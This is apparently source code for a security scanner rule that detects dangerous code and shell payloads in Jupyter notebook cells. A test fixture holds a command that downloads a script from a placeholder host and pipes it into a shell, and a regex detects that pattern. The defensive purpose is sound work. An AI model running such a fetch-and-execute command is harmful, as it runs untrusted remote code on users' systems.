import ast
import json
import re
from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from pathlib import Path

from guardana.core.evaluator.base import Verdict
from guardana.core.report import Evidence, Finding
from guardana.core.rule import RuleContext, RuleMeta
from guardana.core.rule.fixture import FixtureOutcome, RuleFixture, materialise
from guardana.core.safety import Detection
from guardana.core.severity import Severity
from guardana.core.source import PythonSource
from guardana.core.target import Capability, FileReader, Target, TargetKind
from guardana.core.taxonomy import (
    NIST_SUPPLY_CHAIN,
    OWASP_ASI05_2026,
    OWASP_LLM03_2025,
    OWASP_LLM04_2026,
)
from guardana.rules._base import ArtifactRule
from guardana.rules.supply_chain import _samples
from guardana.rules.supply_chain._code_sinks import code_sinks
from guardana.rules.supply_chain._leads import unread_component, unscanned_verdict
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES, read_text_prefix

# Fetching a script and piping it straight into a shell (`curl … | sh`) is the
# classic notebook payload — a channel the `.py` AST scanners never see.
_PIPE_TO_SHELL = re.compile(r"\|\s*(sudo\s+)?(ba)?sh\b")
_SHELL_CELL_MAGIC = ("%%bash", "%%sh", "%%script", "%%sx", "%%system", "%%!")
# IPython shell forms that are not Python: a `!` line escape, and `var = !cmd`.
_ASSIGN_SHELL = re.compile(r"^\s*[\w.]+\s*=\s*!(.*)$")
_SHELL_LINE_MAGICS = frozenset({"system", "sx"})
_OPTION_WORD = re.compile(r"\S+")


@dataclass(frozen=True)
class _MagicOptions:
    """The leading options a Python-running line magic accepts before its statement."""

    flags: str = ""
    valued: str = ""
    long_valued: tuple[str, ...] = ()


# Line magics that execute their argument as Python, with the options IPython
# parses off the front of it (getopt for `timeit`/`prun`, argparse for `debug`).
_PYTHON_LINE_MAGICS = {
    "time": _MagicOptions(),
    "timeit": _MagicOptions(flags="tcqo", valued="nrpv"),
    "prun": _MagicOptions(flags="rq", valued="DlsT"),
    "debug": _MagicOptions(valued="b", long_valued=("breakpoint",)),
}
# Cell magics whose own line, after its options, is also run as Python (the
# setup statement for `%%timeit`); `%%time` refuses code on that line.
_PYTHON_CELL_MAGICS = {name: _PYTHON_LINE_MAGICS[name] for name in ("timeit", "prun", "debug")}


def _cell_source(cell: object) -> str | None:
    """Return a code cell's source (str or list-of-lines joined), else None."""
    if not isinstance(cell, dict) or cell.get("cell_type") != "code":
        return None
    source = cell.get("source")
    if isinstance(source, list):
        return "".join(s for s in source if isinstance(s, str))
    return source if isinstance(source, str) else None


def _malformed_cell(cell: object) -> str | None:
    """Say how a cell breaks the notebook format in a way that would hide code; else None."""
    if not isinstance(cell, dict):
        return "is not a JSON object"
    if cell.get("cell_type") != "code":
        return None
    source = cell.get("source")
    if isinstance(source, str):
        return None
    if isinstance(source, list) and all(isinstance(line, str) for line in source):
        return None
    return "has a source that is not text"


def _short_options(word: str, options: _MagicOptions) -> bool | None:
    """Read a getopt-style cluster such as `-qn1`.

    None means `word` is not an option cluster this magic accepts; otherwise the
    result says whether the next word is the value of its last option.
    """
    if word == "-" or not word.startswith("-") or word.startswith("--"):
        return None
    for position, char in enumerate(word[1:], start=1):
        if char in options.valued:
            return position == len(word) - 1
        if char not in options.flags:
            return None
    return False


def _long_option(word: str, options: _MagicOptions) -> bool | None:
    """Read `--name[=value]`; None unless it abbreviates an option this magic accepts."""
    name, equals, _ = word[2:].partition("=")
    if not word.startswith("--") or not name:
        return None
    if not any(option.startswith(name) for option in options.long_valued):
        return None
    return not equals


def _magic_statement(args: str, options: _MagicOptions) -> str:
    """Return the Python a line magic runs: `args` past the options it accepts.

    The first word that is not an accepted option starts the statement, so an
    unknown option stays in the Python and is parsed with it, never discarded.
    """
    value_pending = False
    for match in _OPTION_WORD.finditer(args):
        word = match.group()
        if value_pending:
            value_pending = False
            continue
        if word == "--":
            return args[match.end() :].lstrip()
        takes_value = _short_options(word, options)
        if takes_value is None:
            takes_value = _long_option(word, options)
        if takes_value is None:
            return args[match.start() :]
        value_pending = takes_value
    return ""


def _magic_python(args: str, options: _MagicOptions | None, indent: str) -> str:
    """Return the Python a magic line contributes in its place; blank if it runs none."""
    if options is None:
        return ""
    statement = _magic_statement(args, options)
    return indent + statement if statement else ""


def _split_shell_and_python(source: str) -> tuple[str, list[str]]:
    """Separate a cell into (Python source, shell command lines).

    `!` escapes, `var = !cmd`, `%system`/`%sx` and `%%bash`-style cell magics run
    a shell, not Python. A magic that runs Python (`%time`, `%timeit`, `%prun`,
    `%debug`, and the first line of `%%timeit`, `%%prun`, `%%debug`) keeps its
    statement in place of the magic; every other magic line is dropped so the
    remaining Python parses. Removed lines are blanked, not deleted, so a
    reported line still maps to the cell.
    """
    lines = source.splitlines()
    # IPython drops leading blank lines before it looks for a cell magic.
    first = next((index for index, line in enumerate(lines) if line.strip()), None)
    if first is not None and lines[first].lstrip().startswith(_SHELL_CELL_MAGIC):
        return "", lines
    python: list[str] = []
    shell: list[str] = []
    for index, line in enumerate(lines):
        stripped = line.lstrip()
        assign = _ASSIGN_SHELL.match(line)
        if stripped.startswith("!"):
            shell.append(stripped[1:])
            python.append("")
        elif assign:
            shell.append(assign.group(1))
            python.append("")
        elif stripped.startswith("%%"):
            name, _, args = stripped[2:].partition(" ")
            options = _PYTHON_CELL_MAGICS.get(name) if index == first else None
            python.append(_magic_python(args, options, ""))
        elif stripped.startswith("%"):
            # IPython takes the magic's name up to the first space, exactly.
            name, _, args = stripped[1:].partition(" ")
            if name in _SHELL_LINE_MAGICS:
                shell.append(args)
                python.append("")
            else:
                indent = line[: len(line) - len(stripped)]
                python.append(_magic_python(args, _PYTHON_LINE_MAGICS.get(name), indent))
        else:
            python.append(line)
    return "\n".join(python), shell


class NotebookPayloadRule(ArtifactRule):
    """Flags dangerous code and shell payloads inside Jupyter notebook (`.ipynb`) cells.

    Notebooks are a primary ML distribution format, yet the `.py` scanners never
    see inside them. This applies the shared code-sink detection to each code
    cell, and catches the notebook-only channels — a `!curl … | sh` escape or a
    `%%bash` cell. A cell whose Python cannot be parsed is surfaced as a lead,
    never silently skipped: an un-analyzable cell is not a proven-clean one.
    """

    meta = RuleMeta(
        id="guardana.supply_chain.notebook_payload",
        title="Dangerous payload in a notebook cell",
        severity=Severity.HIGH,
        target_kind=TargetKind.ARTIFACT,
        taxonomy=(
            OWASP_LLM03_2025,
            OWASP_LLM04_2026,
            NIST_SUPPLY_CHAIN,
            OWASP_ASI05_2026,
        ),
        required_capabilities=frozenset({Capability.READ_FILES}),
        detection=Detection.HEURISTIC,
    )

    def fixtures(self) -> Iterable[RuleFixture]:
        """Sample a download piped to a shell, a plain cell and a notebook that is not JSON."""
        return materialise(
            (
                _samples.sample(
                    "a shell escape piping a download into sh",
                    FixtureOutcome.FINDING,
                    {
                        "setup.ipynb": _samples.notebook(
                            "!curl -s https://setup.example.invalid/i.sh | sh\n"
                        )
                    },
                ),
                _samples.sample(
                    "a cell that only prints",
                    FixtureOutcome.CLEAN,
                    {
                        "setup.ipynb": _samples.notebook(
                            "import json\nprint(json.dumps({'ok': True}))\n"
                        )
                    },
                ),
                _samples.sample(
                    "a notebook cut off mid-document",
                    FixtureOutcome.INCONCLUSIVE,
                    {"setup.ipynb": _samples.notebook("print(1)\n")[:-2]},
                ),
            )
        )

    def run(self, target: Target, ctx: RuleContext) -> Iterable[Finding]:
        """Scan every `.ipynb` for code-execution sinks and shell payloads."""
        if not isinstance(target, FileReader):
            return
        for path in target.iter_files((".ipynb",)):
            yield from self._scan(path, ctx)

    def _scan(self, path: Path, ctx: RuleContext) -> Iterator[Finding]:
        prefix = read_text_prefix(path, errors="ignore")
        if prefix is None:
            yield self._unscanned(path, "the file could not be read", ctx)
            return
        raw, truncated = prefix
        if truncated:
            yield self._unscanned(
                path, f"the file is larger than the {MAX_SCAN_BYTES}-byte read bound", ctx
            )
            return
        try:
            doc = json.loads(raw)
        except ValueError:
            # Not one cell was examined, so a malformed notebook is no cleaner than
            # one that holds a payload.
            yield self._unscanned(path, "the notebook could not be parsed as JSON", ctx)
            return
        cells = doc.get("cells") if isinstance(doc, dict) else None
        if not isinstance(cells, list):
            yield self._unscanned(path, "the notebook declares no list of cells", ctx)
            return
        malformed: str | None = None
        for index, cell in enumerate(cells):
            problem = _malformed_cell(cell)
            if problem is not None:
                malformed = malformed or f"cell {index} {problem}"
                continue
            source = _cell_source(cell)
            if source is not None:
                yield from self._scan_cell(path, index, source)
        if malformed is not None:
            yield self._unscanned(path, malformed, ctx)

    def _unscanned(self, path: Path, reason: str, ctx: RuleContext) -> Finding:
        """Say the notebook was not examined, rather than returning as if it were clean."""
        ctx.shortfall(unread_component(self.meta.id, path, reason))
        return Finding(
            rule_id=self.meta.id,
            severity=Severity.LOW,
            title="Notebook not scanned",
            taxonomy=self.meta.taxonomy,
            target_ref=str(path),
            evidence=Evidence(
                summary=f"notebook not scanned: {reason}", detail=f"file={path.name}"
            ),
            verdict=unscanned_verdict("the notebook could not be read, so nothing was cleared"),
        )

    def _scan_cell(self, path: Path, index: int, source: str) -> Iterator[Finding]:
        python, shell = _split_shell_and_python(source)
        for line in shell:
            if _PIPE_TO_SHELL.search(line):
                yield self._finding(
                    path, index, Severity.HIGH, "shell escape pipes a download into a shell"
                )
        try:
            tree = ast.parse(python)
        except SyntaxError:
            yield self._finding(
                path,
                index,
                Severity.LOW,
                "notebook cell could not be parsed as Python; not analyzed",
                unscanned_verdict("the cell could not be parsed, so nothing in it was cleared"),
            )
            return
        # A notebook cell is source without a file of its own, so it is wrapped in
        # the same index the `.py` rules use — one walk, and `code_sinks` needs no
        # second shape to understand.
        for _lineno, why in code_sinks(PythonSource(path, python, tree)):
            yield self._finding(path, index, Severity.HIGH, why)

    def _finding(
        self,
        path: Path,
        index: int,
        severity: Severity,
        summary: str,
        verdict: Verdict | None = None,
    ) -> Finding:
        return Finding(
            rule_id=self.meta.id,
            severity=severity,
            title=self.meta.title,
            taxonomy=self.meta.taxonomy,
            target_ref=f"{path}:cell{index}",
            evidence=Evidence(summary=summary, detail=f"{path.name} cell {index}"),
            verdict=verdict,
        )
